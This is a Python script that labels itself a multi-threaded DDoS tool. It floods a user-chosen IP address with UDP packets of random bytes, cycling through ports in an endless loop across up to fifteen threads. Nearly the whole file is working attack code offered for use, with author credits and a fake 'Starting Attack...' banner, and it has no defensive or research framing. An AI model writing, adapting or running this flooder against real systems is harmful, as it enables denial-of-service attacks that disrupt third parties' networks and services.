import sys # use system commands
import os # detect the os
import time # use time
import random # make a random byte size
import socket # module to send the packets
import argparse # use terminal arguments

# use multi threading run this alot at the same time
# now it is a DDOS script
from threading import Thread 

# use dates and shit
from datetime import datetime

# declare dates
now = datetime.now() # declares now()
hour = now.hour
minute = now.minute
day = now.day
dtime = now.time() # get the exact seconds

########################################################

# create the socket using UDP instead of TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# creates a random number of bytes, 1490
bytes = random._urandom(1490)

#######################################################


# i'm using argparse to use argument in command line
parser = argparse.ArgumentParser(description="multi threaded network stress tool - (DDOS tool)") # normal parser
#ipgroup = parser.add_mutually_exclusive_group() # special groups

#parser.add_argument("-q", "--quiet", help="outputs just the numbers", action="store_true")
parser.add_argument("-t", "--thread", type=int, help="amount of threads used (max=9), (recomended=3)", nargs='*', dest='thread')
parser.add_argument("-ip", "--ipaddr", help="set the target ip address")
parser.add_argument("-p", "--port", type=int, help="set a port to attack")
parser.add_argument("-pf", "--powershell", help="powershell and admin friendly", action="store_true")
parser.add_argument("-a", "--attack", help="get ridda the shitty 'Starting Attack...' thing", action="store_true")

args = parser.parse_args()


if args.powershell:
	print("\n" * 100)
else:
	os.system("clear")


def startup():
	print()
	print("author: EKO")
	print("instagram: ethan.eko")
	print("github: www.github.com/EKO135")
	print()


	# prompt the user to enter the target ip and port
	global ip
	global port

	if args.ipaddr and args.port:
		# if command line arguments were entered, use them pls
		ip = args.ipaddr
		port = args.port
		

	else: # ask user for the ip and port
		ip = (input("IP    : "))
		
		#try:
		port = int(input("port  : "))
		#except:
		#	print("that's not a number buddy")


	time.sleep(0.10)

	if args.attack:
		pass	
	else:
		print("\n" *100)
		# start the attack ( just for looks c; )
		print("\nStarting Attack.")
		time.sleep(0.75)
		print("\n" *100 + "Starting Attack..")
		time.sleep(0.75)
		print("\n" *100 + "Starting Attack...")

		time.sleep(1)


	if args.powershell:
		print("\n" * 100)
	
	else:
		os.system("clear")


#run the attack
def dos(*args):
	global ip
	global port

	spaceArgs = ' '.join(args)
	Args = ' '.join(args).replace(' ', '')

	time.sleep(3.5)
	# give the program time to let user view created theads... if they entered any
	print()

	sentPackets = 0
	# continuesly send packets
	print(spaceArgs)
	print(" has started\n")

	time.sleep(0.5)

	#if args.repeat:
		#for x in args.repeat


	while True:
		try:
			sock.sendto(bytes, (ip, port)) # use the socket module to send them

			#if args.quiet: # bug
			#	print(f"{sentPackets}, {ip}, {port}") # prints just the simple detail for the user

			#else:
			print(f"{Args} sent {sentPackets} packets to {ip} through port {port} at {dtime}") # prints the detail for the user


			if port == 65534: # if it reaches the highest port, reset
				port = 1


			sentPackets += 1 
			port += 1 # change the entered port by 1 every packet so there is no overflow





		except socket.gaierror as sg:
			print("\n" + Args + " Failed! you entered an invalid ipaddress or port")
			print("Error is: ", sg)

			exit(2)
			sys.exit(0)

		except KeyboardInterrupt: # if ctrl-c is pressed
			print ("caught keyboard interrupt - quitting...")
			sys.exit (0)




def main():
	startup() # run the startup function

	a = 1 
	threadNames =  ['t1', 't2', 't3', 't4', 't5', 
					't6', 't7', 't8', 't9', 't10',
					't11', 't12', 't13', 't14', 't15'] 
	# i created a list with possible names for the threads


	thready = ' '.join(str(args.thread).replace(' ', '')) # turns the tuple into a string

	print("number of threads entered: " + thready)

	if thready == "N o n e": # if no threads were entered
			print("Creating three threads on default")

			for x in range(1, 4):
				print("- t" + str(x))
				time.sleep(0.1)

			# thread just increase the amount of sent packets
			tr1 = Thread(target=dos, args="Thread-1").start()
			time.sleep(0.2)
			tr2 = Thread(target=dos, args="Thread-2").start()
			time.sleep(0.2)
			tr3 = Thread(target=dos, args="Thread-3").start()

			#dos("not a thread")		

	else:

		if len(thready) == 7:
			number_of_threads = thready[2] + thready[4] # take only the 2nd and 34th item out
			number_of_threads = int(number_of_threads)

		elif len(thready) == 5:
			#strnum  = thready[2]
			number_of_threads = int(thready[2])
			# convert the indexes to intergers
			#print("single digit")

		else:
			print("you have not entered the amount of threads correctly")
			# they may have entered "1 5" instead of "15"
		

		if number_of_threads > 15:
			print("15 is the maximum, you enterd " + str(number_of_threads))
			exit(2)
			sys.exit(0)


		print("Creating " + str(number_of_threads) + " Threads")

		for x in range(number_of_threads): # i used a loop that goes for the input amout

			print("- " + str(threadNames[0])) # name the thread based on the first item in the list
			threadNames[0] = Thread(target=dos, args=(f"Thread-{a}")).start() # creates the thread and starts it
			threadNames.pop(0) # delete the first item so the next thread will have a different name
			a += 1 # add one to the variable
			time.sleep(0.2) # wait for 200 milliseconds

		print("\n")



# run the damn thing
if __name__ == '__main__':
	main() # run the main program